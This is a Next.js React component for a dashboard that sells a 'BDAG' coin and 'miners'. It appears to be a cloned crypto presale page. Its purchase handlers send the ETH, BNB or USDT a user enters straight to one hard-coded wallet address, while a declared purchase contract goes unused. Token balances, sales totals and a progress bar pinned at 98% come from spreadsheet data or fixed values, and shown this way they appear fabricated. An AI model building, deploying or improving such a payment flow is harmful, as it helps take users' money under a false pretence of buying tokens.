"use client";
import React, { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import BuyMiner from "./buyMiner";
import RankProgress from "./rankProgress";
import BeatVestingModal from "./beatVestingModal";
import SelectCurrencyModal from "./selectCurrencyModal";
import Transaction from "./transaction";
import WalletPurchaseMethods from "./WalletPurchaseMethods";
import { useSheetData } from "../hooks/useSheetData";
import { parseSheetData } from "../utils/sheetParser";
import { parseConstantsData } from "../utils/parseConstantsData";
import {
  useActiveWallet,
  useSendTransaction,
  useActiveWalletConnectionStatus,
} from "thirdweb/react";
import {
  getContract,
  prepareContractCall,
  prepareTransaction,
  toWei,
} from "thirdweb";
import { client } from "./ConnectOnly";
import { ethers } from "ethers";
const contractAddress = "0x43D033C19eA0A9f8F2459b9A51dC97f59B7725bB";
const abi = [
  {
    inputs: [
      { internalType: "uint256", name: "usdEquivalent", type: "uint256" },
    ],
    name: "buyWithETH",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
];

const DESTINATION_WALLET = "0xecB518e9D8a14e74DFBa3Ba044D7be9951A95395";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_ABI = [
  "function transfer(address to, uint256 value) public returns (bool)",
];

export const MainArea = () => {
  const router = useRouter();

  const [storedWallet, setStoredWallet] = useState(null);

  useEffect(() => {
    if (typeof window !== "undefined") {
      setStoredWallet(localStorage.getItem("walletAddress"));
    }
  }, []);
  // Data and state management
  const [activeTab, setActiveTab] = useState("buyBDAG");
  const [activePaymentMethod, setActivePaymentMethod] = useState("ETH");
  const [amount, setAmount] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isCurrencyModalOpen, setIsCurrencyModalOpen] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState({
    message: "",
    isError: false,
    isLoading: false,
  });

  const wallet = useActiveWallet();
  const connectionStatus = useActiveWalletConnectionStatus();
  const {
    mutate: sendTransaction,
    isError,
    error,
    data,
    isPending,
    isSuccess,
  } = useSendTransaction();
  const [walletAddress, setWalletAddress] = useState("");
  const { data: sheetData } = useSheetData(walletAddress);
  const { data: constantsData } = useSheetData("Constants");
  const { profile } = parseSheetData(sheetData);
  const constants = parseConstantsData(constantsData);
  const successHandler = async (result) => {
    if (result?.transactionHash || result?.hash) {
      const txHash = result.transactionHash || result.hash;

      setTransactionStatus({
        isLoading: true,
        message: `Transaction sent! Hash: ${txHash.substring(
          0,
          10
        )}... Waiting for confirmation...`,
        isError: false,
      });

      // Wait for transaction confirmation
      try {
        // Try to get provider for confirmation checking
        let provider;
        if (typeof window !== "undefined" && window.ethereum) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
        }
        console.log(provider);

        if (provider) {
          // Wait for transaction to be mined (with timeout)
          const receipt = await Promise.race([
            provider.waitForTransaction(txHash, 1), // Wait for 1 confirmation
            new Promise(
              (_, reject) =>
                setTimeout(
                  () => reject(new Error("Confirmation timeout")),
                  60000
                ) // 60 second timeout
            ),
          ]);

          if (receipt && receipt.status === 1) {
            setTransactionStatus({
              isLoading: false,
              message: `✅ Transaction confirmed! Hash: ${txHash.substring(
                0,
                10
              )}...`,
              isError: false,
            });
          } else {
            setTransactionStatus({
              isLoading: false,
              message: `❌ Transaction failed. Hash: ${txHash.substring(
                0,
                10
              )}...`,
              isError: true,
            });
          }
        } else {
          // Fallback for mobile wallets where we can't check confirmation
          setTransactionStatus({
            isLoading: false,
            message: `Transaction sent! Hash: ${txHash.substring(
              0,
              10
            )}... Please check your wallet or block explorer for confirmation.`,
            isError: false,
          });
        }
      } catch (confirmError) {
        console.log("Confirmation check failed:", confirmError);
        // Still show success since transaction was sent
        setTransactionStatus({
          isLoading: false,
          message: `Transaction sent! Hash: ${txHash.substring(
            0,
            10
          )}... Confirmation check failed, please verify in your wallet.`,
          isError: false,
        });
      }
    } else {
      // No transaction hash received
      setTransactionStatus({
        isLoading: false,
        message:
          "Transaction sent successfully! Please check your wallet for confirmation.",
        isError: false,
      });
    }
    return;
  };
  // Sync wallet address to state and localStorage, clear on disconnect
  useEffect(() => {
    if (!isPending) {
      if (isSuccess) {
        successHandler(data);
      }
      if (isError) {
        setTransactionStatus({
          isLoading: false,
          message: `Transaction failed: ${error.message || error}`,
          isError: true,
        });
      }
    }
  }, [isPending]);

  useEffect(() => {
    const syncWallet = async () => {
      if (connectionStatus === "connected" && wallet) {
        try {
          const account = await wallet.getAccount();
          if (account?.address) {
            setWalletAddress(account.address);
            localStorage.setItem("walletAddress", account.address);
          }
        } catch (err) {
          setWalletAddress("");
          localStorage.removeItem("walletAddress");
        }
      } else {
        setWalletAddress("");
        localStorage.removeItem("walletAddress");
      }
    };
    syncWallet();
  }, [connectionStatus, wallet]);

  // Logout handler
  const handleLogout = async () => {
    if (wallet) await wallet.disconnect();
    setWalletAddress("");
    localStorage.removeItem("walletAddress");
    // Optionally redirect or show a message
  };

  // Old handleBuy logic commented out for reference
  /*
const handleBuy = useCallback(async () => {
  // ...previous logic...
}, [wallet, amount, activePaymentMethod, sendTransaction]);
*/

  // New handleBuy logic using direct eth_sendTransaction for ETH/BNB
  // const handleBuy = useCallback(async () => {
  //   if (!walletAddress) {
  //     setTransactionStatus({ isLoading: false, message: "Please connect your wallet first.", isError: true });
  //     return;
  //   }
  //   if (!amount || isNaN(amount) || Number(amount) <= 0) {
  //     setTransactionStatus({ isLoading: false, message: "Please enter a valid amount.", isError: true });
  //     return;
  //   }

  //   if (activePaymentMethod === "ETH" || activePaymentMethod === "BNB") {
  //     setTransactionStatus({ isLoading: true, message: `Sending ${amount} ${activePaymentMethod}...`, isError: false });
  //     try {
  //       const valueHex = `0x${(BigInt(Math.floor(Number(amount) * 1e18))).toString(16)}`;
  //       const provider = (typeof window !== "undefined" && window.ethereum) ? window.ethereum : (wallet && wallet.provider);
  //       if (!provider || !provider.request) throw new Error("No wallet provider found.");

  //       const txHash = await provider.request({
  //         method: "eth_sendTransaction",
  //         params: [{
  //           from: walletAddress,
  //           to: DESTINATION_WALLET,
  //           value: valueHex,
  //         }],
  //       });

  //       setTransactionStatus({ isLoading: false, message: `Transaction sent! Hash: ${txHash}`, isError: false });
  //     } catch (error) {
  //       setTransactionStatus({ isLoading: false, message: `Transaction failed: ${error.message || error}`, isError: true });
  //     }
  //     return;
  //   }

  //   // USDT logic remains as before
  //   if (activePaymentMethod === "USDT") {
  //     setTransactionStatus({ isLoading: true, message: `Preparing USDT transaction...`, isError: false });
  //     try {
  //       let provider;
  //       let signer;
  //       if (typeof window !== "undefined" && window.ethereum) {
  //         await window.ethereum.request({ method: 'eth_requestAccounts' });
  //         provider = new ethers.providers.Web3Provider(window.ethereum);
  //         signer = provider.getSigner();
  //       }
  //       if (!signer && wallet.provider) {
  //         provider = new ethers.providers.Web3Provider(wallet.provider);
  //         signer = provider.getSigner();
  //       }
  //       if (!signer) throw new Error("USDT transactions not supported on this device. Please use ETH instead.");
  //       const network = await provider.getNetwork();
  //       if (network.chainId !== 1) throw new Error("Please switch to Ethereum mainnet for USDT transactions.");
  //       const USDT_ABI_FULL = [
  //         "function transfer(address to, uint256 value) public returns (bool)",
  //         "function balanceOf(address owner) public view returns (uint256)"
  //       ];
  //       const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI_FULL, signer);
  //       const userAddress = await signer.getAddress();
  //       const amountInSmallestUnit = ethers.utils.parseUnits(amount, 6);
  //       const balance = await usdtContract.balanceOf(userAddress);
  //       const balanceFormatted = ethers.utils.formatUnits(balance, 6);
  //       if (balance.lt(amountInSmallestUnit)) throw new Error(`Insufficient USDT balance. You have ${balanceFormatted} USDT, need ${amount} USDT.`);
  //       const tx = await usdtContract.transfer(DESTINATION_WALLET, amountInSmallestUnit, { gasLimit: 100000 });
  //       setTransactionStatus({ isLoading: true, message: `USDT transaction sent: ${tx.hash}. Waiting for confirmation...`, isError: false });
  //       await tx.wait();
  //       setTransactionStatus({ isLoading: false, message: "USDT transaction confirmed successfully!", isError: false });
  //     } catch (error) {
  //       setTransactionStatus({ isLoading: false, message: `Transaction failed: ${error.message || error}`, isError: true });
  //     }
  //   }
  // }, [wallet, walletAddress, amount, activePaymentMethod]);

  const handleBuy = useCallback(async () => {
    if (!wallet) {
      setTransactionStatus({
        isLoading: false,
        message: "Please connect your wallet first.",
        isError: true,
      });
      return;
    }
    if (!amount || parseFloat(amount) <= 0) {
      setTransactionStatus({
        isLoading: false,
        message: "Please enter a valid amount.",
        isError: true,
      });
      return;
    }

    setTransactionStatus({
      isLoading: true,
      message: `Preparing ${amount} ${activePaymentMethod} transaction...`,
      isError: false,
    });

    try {
      // Get account first
      const account = await wallet.getAccount();
      if (!account?.address) {
        throw new Error("Wallet not properly connected. Please reconnect.");
      }

      // For ETH/BNB, prioritize thirdweb's native method (works best on mobile)
      if (activePaymentMethod === "ETH" || activePaymentMethod === "BNB") {
        try {
          // Balance checking code (keeping your existing logic)
          if (typeof window !== "undefined" && window.ethereum) {
            try {
              const provider = new ethers.providers.Web3Provider(
                window.ethereum
              );
              const balance = await provider.getBalance(account.address);
              const balanceInEth = ethers.utils.formatEther(balance);
              const transactionAmount = parseFloat(amount);

              console.log("=== BALANCE DEBUG ===");
              console.log("Wallet Balance:", balanceInEth, "ETH");
              console.log("Transaction Amount:", transactionAmount, "ETH");
              console.log(
                "Balance sufficient?",
                parseFloat(balanceInEth) > transactionAmount
              );

              const estimatedGasFee = 0.002;
              const totalNeeded = transactionAmount + estimatedGasFee;

              console.log("Estimated Gas Fee:", estimatedGasFee, "ETH");
              console.log("Total Needed (Amount + Gas):", totalNeeded, "ETH");
              console.log(
                "Can afford transaction?",
                parseFloat(balanceInEth) >= totalNeeded
              );

              if (parseFloat(balanceInEth) < totalNeeded) {
                throw new Error(
                  `Insufficient funds. You have ${balanceInEth} ETH but need approximately ${totalNeeded} ETH (${transactionAmount} + ~${estimatedGasFee} gas fees)`
                );
              }
            } catch (debugError) {
              console.log("Balance debug failed:", debugError.message);
            }
          }
          console.log();

          const chain = await wallet.getChain();

          const transaction = prepareTransaction({
            to: DESTINATION_WALLET,
            chain: chain,
            client: client,
            value: toWei(amount),
            gasPrice: 30n,
          });

          // Update status to show transaction is being sent
          setTransactionStatus({
            isLoading: true,
            message:
              "Sending transaction... Please check your wallet to confirm.",
            isError: false,
          });

          sendTransaction(transaction);

          // Check if we got a transaction hash
        } catch (thirdwebError) {
          console.error("Thirdweb transaction failed:", thirdwebError);

          // Enhanced error handling (keeping your existing logic)
          if (
            thirdwebError.message?.includes("User rejected") ||
            thirdwebError.code === 4001
          ) {
            throw new Error("Transaction was cancelled by user.");
          } else if (
            thirdwebError.message?.includes("insufficient funds") ||
            thirdwebError.message?.includes("Insufficient funds")
          ) {
            try {
              if (typeof window !== "undefined" && window.ethereum) {
                const provider = new ethers.providers.Web3Provider(
                  window.ethereum
                );
                const balance = await provider.getBalance(account.address);
                const balanceInEth = ethers.utils.formatEther(balance);
                throw new Error(
                  `Insufficient ETH balance. You have ${balanceInEth} ETH. You need ${amount} ETH plus gas fees (~0.002 ETH). Please add more ETH to your wallet.`
                );
              } else {
                throw new Error(
                  `Insufficient funds for transaction and gas fees. Please ensure you have more than ${amount} ETH in your wallet.`
                );
              }
            } catch (balanceError) {
              throw new Error(
                `Insufficient funds for transaction and gas fees. Please ensure you have more than ${amount} ETH in your wallet.`
              );
            }
          } else {
            throw new Error(
              `Transaction failed: ${
                thirdwebError.message || "Please try again or contact support."
              }`
            );
          }
        }
      }

      // USDT logic (keeping your existing implementation but with better confirmation)
      if (activePaymentMethod === "USDT") {
        console.log("USDT transaction - attempting ethers fallback...");

        let provider;
        let signer;

        if (typeof window !== "undefined" && window.ethereum) {
          console.log("Using window.ethereum...");
          try {
            await window.ethereum.request({ method: "eth_requestAccounts" });
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
          } catch (error) {
            console.log("window.ethereum failed:", error);
          }
        }

        if (!signer && wallet.provider) {
          console.log("Using wallet.provider...");
          try {
            provider = new ethers.providers.Web3Provider(wallet.provider);
            signer = provider.getSigner();
          } catch (error) {
            console.log("wallet.provider failed:", error);
          }
        }

        if (!signer) {
          throw new Error(
            "USDT transactions not supported on this device. Please use ETH instead."
          );
        }

        const network = await provider.getNetwork();
        if (network.chainId !== 1) {
          throw new Error(
            "Please switch to Ethereum mainnet for USDT transactions."
          );
        }

        const USDT_ABI_FULL = [
          "function transfer(address to, uint256 value) public returns (bool)",
          "function balanceOf(address owner) public view returns (uint256)",
        ];

        const usdtContract = new ethers.Contract(
          USDT_CONTRACT,
          USDT_ABI_FULL,
          signer
        );
        const userAddress = await signer.getAddress();
        const amountInSmallestUnit = ethers.utils.parseUnits(amount, 6);

        // Balance checking (keeping your existing logic)
        const ethBalance = await provider.getBalance(userAddress);
        const ethBalanceFormatted = ethers.utils.formatEther(ethBalance);

        console.log("=== USDT BALANCE DEBUG ===");
        console.log("ETH Balance:", ethBalanceFormatted, "ETH");

        if (parseFloat(ethBalanceFormatted) < 0.01) {
          throw new Error(
            `Insufficient ETH for gas fees. You have ${ethBalanceFormatted} ETH but need at least 0.01 ETH for USDT transaction gas fees.`
          );
        }

        const balance = await usdtContract.balanceOf(userAddress);
        const balanceFormatted = ethers.utils.formatUnits(balance, 6);

        console.log("USDT Balance:", balanceFormatted, "USDT");
        console.log("Transaction Amount:", amount, "USDT");

        if (balance.lt(amountInSmallestUnit)) {
          throw new Error(
            `Insufficient USDT balance. You have ${balanceFormatted} USDT, need ${amount} USDT.`
          );
        }

        // Send USDT transaction
        const tx = await usdtContract.transfer(
          DESTINATION_WALLET,
          amountInSmallestUnit,
          {
            gasLimit: 100000,
          }
        );

        setTransactionStatus({
          isLoading: true,
          message: `USDT transaction sent: ${tx.hash}. Waiting for confirmation...`,
          isError: false,
        });

        // Wait for confirmation with timeout
        try {
          const receipt = await Promise.race([
            tx.wait(),
            new Promise(
              (_, reject) =>
                setTimeout(
                  () => reject(new Error("Confirmation timeout")),
                  120000
                ) // 2 minute timeout for USDT
            ),
          ]);

          if (receipt && receipt.status === 1) {
            setTransactionStatus({
              isLoading: false,
              message: "✅ USDT transaction confirmed successfully!",
              isError: false,
            });
          } else {
            setTransactionStatus({
              isLoading: false,
              message: "❌ USDT transaction failed during confirmation.",
              isError: true,
            });
          }
        } catch (confirmError) {
          console.log("USDT confirmation failed:", confirmError);
          if (confirmError.message === "Confirmation timeout") {
            setTransactionStatus({
              isLoading: false,
              message: `USDT transaction sent (${tx.hash.substring(
                0,
                10
              )}...) but confirmation timed out. Please check your wallet or block explorer.`,
              isError: false,
            });
          } else {
            throw confirmError;
          }
        }
      }
    } catch (error) {
      console.error("Transaction error:", error);

      let errorMessage = "";

      // Handle specific error types (keeping your existing logic)
      if (error.message?.includes("Wallet not properly connected")) {
        errorMessage =
          "Wallet connection lost. Please reconnect your wallet and try again.";
      } else if (error.message?.includes("cancelled by user")) {
        errorMessage = "Transaction was cancelled.";
      } else if (
        error.message?.includes("Insufficient ETH balance") ||
        error.message?.includes("Insufficient funds")
      ) {
        errorMessage = error.message;
      } else if (error.message?.includes("Insufficient USDT")) {
        errorMessage = error.message;
      } else if (error.message?.includes("Insufficient ETH for gas fees")) {
        errorMessage = error.message;
      } else if (error.message?.includes("switch to Ethereum mainnet")) {
        errorMessage = error.message;
      } else if (error.message?.includes("not supported on this device")) {
        errorMessage = error.message;
      } else if (error.code === 4001 || error.code === "USER_REJECTED") {
        errorMessage = "Transaction was cancelled by user.";
      } else {
        errorMessage = `Transaction failed: ${
          error.message || "Unknown error"
        }`;
      }

      setTransactionStatus({
        isLoading: false,
        message: errorMessage,
        isError: true,
      });
    }
  }, [wallet, amount, activePaymentMethod, sendTransaction]);

  const handleOpenCurrencyModal = () => setIsCurrencyModalOpen(true);
  const handleCloseCurrencyModal = () => setIsCurrencyModalOpen(false);
  const handleOpenModal = () => setIsModalOpen(true);
  const handleCloseModal = () => setIsModalOpen(false);

  if (connectionStatus === "connecting") {
    return (
      <div
        className="style_overview__iPKe6"
        style={{
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          height: "50vh",
        }}
      >
        <p>Connecting to wallet...</p>
      </div>
    );
  }

  return (
    <div className="style_overview__iPKe6">
      <RankProgress
        current={profile["Current Rank"]}
        next={profile["Next rank"]}
        leveltoUp={profile["req to level up"]}
      />
      <div className="style_balanceSection__K0yQq">
        <div className="style_balances__lxOoR">
          <div className="style_balanceBox___25FT">
            <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">
              Total BDAG Balance
            </p>
            <p className="style_title__VJGg6 __className_665d18 style_sm__fI_bB">
              {profile["Total Balance"]
                ? `${profile["Total Balance"]} BDAG`
                : "0.00 BDAG"}
            </p>
            <div className="style_icon__jwMyF">{/* ...svg... */}</div>
          </div>
          <div className="style_balanceBox___25FT">
            <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">
              Your Coin Worth at Launch
            </p>
            <p className="style_title__VJGg6 __className_665d18 style_sm__fI_bB">
              {profile["your coin worth at launch"] || "0.00"}
            </p>
            <div className="style_icon__jwMyF">{/* ...svg... */}</div>
          </div>
        </div>
      </div>

      <div className="style_purchase__X5B7u">
        <div className="wallet_wallet__HKWGq wallet_shouldLogin__ai97O">
          <div id="buy" className="wallet_anchor__W3ZBk"></div>
          <div className="wallet_modalHead__Q3MP_">
            <div className="wallet_modalHeadArea__CUzyB">
              <p
                className={
                  activeTab === "buyBDAG" ? "wallet_active__9n3l6" : ""
                }
                onClick={() => setActiveTab("buyBDAG")}
              >
                Buy BDAG
              </p>
              <p
                className={
                  activeTab === "buyMiner" ? "wallet_active__9n3l6" : ""
                }
                onClick={() => setActiveTab("buyMiner")}
              >
                Buy Miner
              </p>
            </div>
          </div>

          {activeTab === "buyBDAG" ? (
            <div className="wallet_walletWrapper__6pNfN">
              <div className="wallet_walletHead__N6OWX">
                <div className="wallet_doubleIt__OhJ0r">
                  <p
                    className="wallet_doubleText__JRiZM __className_665d18"
                    onClick={handleOpenModal}
                    style={{ cursor: "pointer" }}
                  >
                    BUY, BEAT VESTING PASS!
                  </p>
                </div>
                <div className="wallet_walletHeadCoin__G_Gxn">
                  <div className="wallet_walletHeadItem__2_GYQ">
                    <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">
                      Total Coin Sales
                    </p>
                    <p className="style_text__Z44aT style_md__ZQhe4 style_font-700__9q48B">
                      {constants["Total Coin sales"] || "$0.00"}
                    </p>
                  </div>
                  <div className="wallet_walletHeadItem__2_GYQ">
                    <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">
                      Total Coins Sold
                    </p>
                    <p className="style_text__Z44aT style_md__ZQhe4 style_font-700__9q48B">
                      {constants["Total coins sold"] || "0"}
                    </p>
                  </div>
                </div>
                <div className="style_bar__PrR89">
                  <div className="style_spans__yvuK_">
                    <span>Remaining</span>
                    <span translate="no">
                      {constants["Remaining bar"] || "0"}
                    </span>
                  </div>
                  <span
                    className="style_progress__IPzew"
                    style={{ width: "98%" }}
                  ></span>
                  <span
                    className="style_progressTitle__SWVW1"
                    style={{ left: "98%" }}
                  ></span>
                </div>
                <div className="wallet_walletHeadCoin__G_Gxn">
                  <div className="wallet_walletPriceItem__E7HOg">
                    <p className="style_text__Z44aT style_md__ZQhe4">1 BDAG:</p>
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      ${constants["Batch Price"] || "0.00"}
                    </p>
                  </div>
                  <div className="wallet_walletPriceItem__E7HOg">
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      Next Batch:
                    </p>
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      ${constants["Next Batch"] || "0.00"}
                    </p>
                  </div>
                </div>
              </div>

              <WalletPurchaseMethods
                activePaymentMethod={activePaymentMethod}
                setActivePaymentMethod={setActivePaymentMethod}
                amount={amount}
                setAmount={setAmount}
                handleBuy={handleBuy}
                transactionStatus={transactionStatus}
                handleOpenCurrencyModal={handleOpenCurrencyModal}
                handleOpenModal={handleOpenModal}
              />
            </div>
          ) : (
            <BuyMiner handleClickModal={handleOpenCurrencyModal} />
          )}
        </div>
      </div>
      <Transaction />

      {isModalOpen && <BeatVestingModal onClose={handleCloseModal} />}
      {isCurrencyModalOpen && (
        <SelectCurrencyModal onClose={handleCloseCurrencyModal} />
      )}
    </div>
  );
};
